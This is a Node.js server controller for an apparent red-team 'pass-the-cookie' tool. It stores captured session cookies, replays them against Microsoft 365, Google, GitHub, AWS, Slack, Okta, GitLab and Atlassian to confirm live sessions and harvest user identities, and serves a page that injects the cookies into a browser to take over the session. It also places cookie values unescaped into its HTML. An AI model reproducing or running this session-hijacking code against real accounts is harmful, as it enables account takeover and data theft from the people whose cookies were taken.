const mongoose = require('mongoose');

// ── CookieEntry Schema ────────────────────────────────────────────────────────
const cookieEntrySchema = new mongoose.Schema(
  {
    engagementId: { type: String, required: true, index: true },
    app:          { type: String },
    label:        { type: String },
    cookieString: { type: String },
    extra:        { type: mongoose.Schema.Types.Mixed, default: {} },
    status:       { type: String, default: null },   // valid | invalid | testing | null
    user:         { type: mongoose.Schema.Types.Mixed, default: null },
    detail:       { type: String, default: null },
    testedAt:     { type: Date, default: null },
  },
  { timestamps: true }
);

const CookieEntry = mongoose.model('CookieEntry', cookieEntrySchema);

// ── CRUD exports ──────────────────────────────────────────────────────────────

// GET /api/pass-cookie/entries?engagementId=
exports.getEntries = async (req, res) => {
  try {
    const { engagementId } = req.query;
    if (!engagementId) return res.status(400).json({ error: 'engagementId is required' });
    const entries = await CookieEntry.find({ engagementId }).sort({ createdAt: -1 });
    res.json(entries);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
};

// POST /api/pass-cookie/entries
exports.createEntry = async (req, res) => {
  try {
    const { engagementId, app, label, cookieString, extra } = req.body;
    if (!engagementId) return res.status(400).json({ error: 'engagementId is required' });
    const entry = await CookieEntry.create({ engagementId, app, label, cookieString, extra });
    res.status(201).json(entry);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
};

// PUT /api/pass-cookie/entries/:id
exports.updateEntry = async (req, res) => {
  try {
    const { id } = req.params;
    const { status, user, detail, testedAt, label } = req.body;
    const update = {};
    if (status    !== undefined) update.status   = status;
    if (user      !== undefined) update.user     = user;
    if (detail    !== undefined) update.detail   = detail;
    if (testedAt  !== undefined) update.testedAt = testedAt;
    if (label     !== undefined) update.label    = label;
    const entry = await CookieEntry.findByIdAndUpdate(id, { $set: update }, { new: true });
    if (!entry) return res.status(404).json({ error: 'Entry not found' });
    res.json(entry);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
};

// DELETE /api/pass-cookie/entries/:id
exports.deleteEntry = async (req, res) => {
  try {
    const { id } = req.params;
    const entry = await CookieEntry.findByIdAndDelete(id);
    if (!entry) return res.status(404).json({ error: 'Entry not found' });
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
};

// DELETE /api/pass-cookie/entries?engagementId=
exports.clearEntries = async (req, res) => {
  try {
    const { engagementId } = req.query;
    if (!engagementId) return res.status(400).json({ error: 'engagementId is required' });
    const result = await CookieEntry.deleteMany({ engagementId });
    res.json({ deleted: result.deletedCount });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
};

// ─────────────────────────────────────────────────────────────────────────────

const https = require('https');

// ── HTTPS helper ─────────────────────────────────────────────────────────────
function httpsGet({ hostname, path, headers }) {
  return new Promise((resolve, reject) => {
    const req = https.request({ hostname, path, method: 'GET', headers }, (res) => {
      let raw = '';
      res.on('data', (c) => { raw += c; });
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: raw }));
    });
    req.on('error', reject);
    req.end();
  });
}

// ── App test definitions ──────────────────────────────────────────────────────
// Each app has a validation function that returns { valid, user, detail }
const APP_TESTS = {
  microsoft365: async (cookieString) => {
    // Test against OWA who-am-I endpoint
    const r = await httpsGet({
      hostname: 'outlook.office365.com',
      path: '/owa/service.svc/s/GetPersonaPhoto?email=me&size=HR48x48',
      headers: { Cookie: cookieString, 'User-Agent': 'Mozilla/5.0', Accept: 'application/json' },
    });
    // OWA returns 302 to login if cookie invalid, 200/404 if valid session
    if (r.status === 302 && (r.headers.location || '').includes('login.microsoftonline')) {
      return { valid: false, user: null, detail: 'Cookie expired or invalid — redirected to login' };
    }
    // Try graph with ESTSAUTH cookie (works if FOCI/SSO session active)
    const r2 = await httpsGet({
      hostname: 'substrate.office.com',
      path: '/profile/v1.0/me/profilecards',
      headers: { Cookie: cookieString, 'User-Agent': 'Mozilla/5.0', Accept: 'application/json', 'client-request-id': '00000000-0000-0000-0000-000000000001' },
    });
    if (r2.status === 200) {
      try {
        const d = JSON.parse(r2.body);
        return { valid: true, user: { name: d.displayName, email: d.userPrincipalName }, detail: 'Active session confirmed' };
      } catch {}
    }
    if (r.status !== 302) return { valid: true, user: null, detail: `Session active (HTTP ${r.status})` };
    return { valid: false, user: null, detail: `HTTP ${r.status}` };
  },

  google: async (cookieString) => {
    const r = await httpsGet({
      hostname: 'myaccount.google.com',
      path: '/personal-info',
      headers: { Cookie: cookieString, 'User-Agent': 'Mozilla/5.0', Accept: 'text/html' },
    });
    if (r.status === 302 && (r.headers.location || '').includes('accounts.google.com')) {
      return { valid: false, user: null, detail: 'Cookie expired — redirected to Google login' };
    }
    if (r.status === 200) return { valid: true, user: null, detail: 'Session active' };
    return { valid: false, user: null, detail: `HTTP ${r.status}` };
  },

  github: async (cookieString) => {
    const r = await httpsGet({
      hostname: 'github.com',
      path: '/settings/profile',
      headers: { Cookie: cookieString, 'User-Agent': 'Mozilla/5.0', Accept: 'text/html' },
    });
    if (r.status === 302 && (r.headers.location || '').includes('/login')) {
      return { valid: false, user: null, detail: 'Cookie expired — redirected to login' };
    }
    if (r.status === 200) {
      // Try to extract username from HTML
      const match = r.body.match(/content="@([^"]+)"/);
      const user = match ? { name: match[1] } : null;
      return { valid: true, user, detail: 'Session active' };
    }
    return { valid: false, user: null, detail: `HTTP ${r.status}` };
  },

  aws: async (cookieString) => {
    const r = await httpsGet({
      hostname: 'us-east-1.console.aws.amazon.com',
      path: '/console/home?region=us-east-1',
      headers: { Cookie: cookieString, 'User-Agent': 'Mozilla/5.0', Accept: 'text/html' },
    });
    if (r.status === 302 && (r.headers.location || '').includes('signin.aws.amazon.com')) {
      return { valid: false, user: null, detail: 'Cookie expired — redirected to AWS login' };
    }
    if (r.status === 200 && !r.body.includes('signin.aws.amazon.com')) {
      const match = r.body.match(/data-account-id="(\d+)"/);
      return { valid: true, user: match ? { name: `Account: ${match[1]}` } : null, detail: 'Session active' };
    }
    return { valid: false, user: null, detail: `HTTP ${r.status}` };
  },

  slack: async (cookieString) => {
    const r = await httpsGet({
      hostname: 'slack.com',
      path: '/api/auth.test',
      headers: { Cookie: cookieString, 'User-Agent': 'Mozilla/5.0', Accept: 'application/json' },
    });
    if (r.status === 200) {
      try {
        const d = JSON.parse(r.body);
        if (d.ok) return { valid: true, user: { name: d.user, email: d.email, extra: d.team }, detail: 'Session active' };
      } catch {}
    }
    return { valid: false, user: null, detail: 'Cookie invalid or expired' };
  },

  okta: async (cookieString, extra) => {
    const domain = extra?.domain || 'company.okta.com';
    const r = await httpsGet({
      hostname: domain,
      path: '/api/v1/users/me',
      headers: { Cookie: cookieString, 'User-Agent': 'Mozilla/5.0', Accept: 'application/json' },
    });
    if (r.status === 200) {
      try {
        const d = JSON.parse(r.body);
        return { valid: true, user: { name: `${d.profile?.firstName} ${d.profile?.lastName}`, email: d.profile?.email }, detail: 'Session active' };
      } catch {}
    }
    return { valid: false, user: null, detail: `HTTP ${r.status}` };
  },

  gitlab: async (cookieString) => {
    const r = await httpsGet({
      hostname: 'gitlab.com',
      path: '/api/v4/user',
      headers: { Cookie: cookieString, 'User-Agent': 'Mozilla/5.0', Accept: 'application/json' },
    });
    if (r.status === 200) {
      try {
        const d = JSON.parse(r.body);
        return { valid: true, user: { name: d.name, email: d.email, extra: d.username }, detail: 'Session active' };
      } catch {}
    }
    return { valid: false, user: null, detail: `HTTP ${r.status}` };
  },

  atlassian: async (cookieString) => {
    const r = await httpsGet({
      hostname: 'id.atlassian.com',
      path: '/manage-profile',
      headers: { Cookie: cookieString, 'User-Agent': 'Mozilla/5.0', Accept: 'text/html' },
    });
    if (r.status === 302 && (r.headers.location || '').includes('login')) {
      return { valid: false, user: null, detail: 'Cookie expired' };
    }
    if (r.status === 200) return { valid: true, user: null, detail: 'Session active' };
    return { valid: false, user: null, detail: `HTTP ${r.status}` };
  },
};

// POST /api/pass-cookie/test
exports.testCookie = async (req, res) => {
  try {
    const { app, cookieString, extra } = req.body;
    if (!app || !cookieString) return res.status(400).json({ error: 'app and cookieString are required' });
    const tester = APP_TESTS[app];
    if (!tester) return res.status(400).json({ error: `Unknown app: ${app}` });
    const result = await tester(cookieString, extra);
    res.json(result);
  } catch (e) {
    res.status(500).json({ valid: false, user: null, detail: e.message });
  }
};

// GET /api/pass-cookie/open-session?app=&t=
// Body is posted via a hidden form — cookies injected via JS bookmarklet approach
exports.openSession = (req, res) => {
  const { app, t } = req.query;
  // cookieString passed in body via POST
  const cookieString = req.body?.cookieString || '';

  const APP_URLS = {
    microsoft365: 'https://www.office.com/',
    google:       'https://myaccount.google.com/',
    github:       'https://github.com/',
    aws:          'https://console.aws.amazon.com/',
    slack:        'https://app.slack.com/',
    okta:         `https://${req.body?.extra?.domain || 'company.okta.com'}/`,
    gitlab:       'https://gitlab.com/',
    atlassian:    'https://id.atlassian.com/',
  };
  const targetUrl = APP_URLS[app] || 'https://example.com';

  // Parse cookie string into name=value pairs
  const cookies = cookieString.split(/;\s*/).map((c) => {
    const idx = c.indexOf('=');
    if (idx === -1) return null;
    return { name: c.slice(0, idx).trim(), value: c.slice(idx + 1).trim() };
  }).filter(Boolean);

  const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Opening ${app}...</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{background:#0F1117;color:#fff;font-family:system-ui,sans-serif;
      display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;gap:16px}
    .spinner{width:36px;height:36px;border:3px solid rgba(255,255,255,0.1);
      border-top-color:#68D391;border-radius:50%;animation:spin .8s linear infinite}
    @keyframes spin{to{transform:rotate(360deg)}}
    .msg{font-size:14px;color:rgba(255,255,255,0.6)}
    .info{font-size:12px;color:rgba(255,255,255,0.3);text-align:center;max-width:460px;line-height:1.7}
    .cookies{background:rgba(255,255,255,0.05);border-radius:8px;padding:12px;
      font-family:monospace;font-size:11px;color:#68D391;max-width:600px;
      max-height:200px;overflow-y:auto;text-align:left;width:100%}
    .cookie-row{padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.05)}
  </style>
</head>
<body>
  <div class="spinner"></div>
  <div class="msg" id="msg">Injecting cookies...</div>
  <div class="info" id="info">Setting ${cookies.length} cookie(s) for ${targetUrl}</div>
  <div class="cookies" id="cookie-list">
    ${cookies.map((c) => `<div class="cookie-row">▸ ${c.name} = ${c.value.slice(0, 40)}${c.value.length > 40 ? '…' : ''}</div>`).join('')}
  </div>
  <script>
    const COOKIES = ${JSON.stringify(cookies)};
    const TARGET  = ${JSON.stringify(targetUrl)};
    let set = 0;
    COOKIES.forEach(c => {
      try {
        // Set with broad domain/path — works for non-httpOnly cookies
        document.cookie = c.name + '=' + c.value + '; path=/; domain=; SameSite=None; Secure';
        set++;
      } catch(e) {}
    });
    document.getElementById('msg').textContent = 'Cookies set (' + set + '/' + COOKIES.length + ') — redirecting...';
    document.getElementById('info').textContent =
      'Note: httpOnly cookies cannot be set via JavaScript. Use the browser extension method for those.';
    setTimeout(() => { window.location.href = TARGET; }, 1200);
  </script>
</body>
</html>`;

  res.setHeader('Content-Type', 'text/html');
  res.send(html);
};
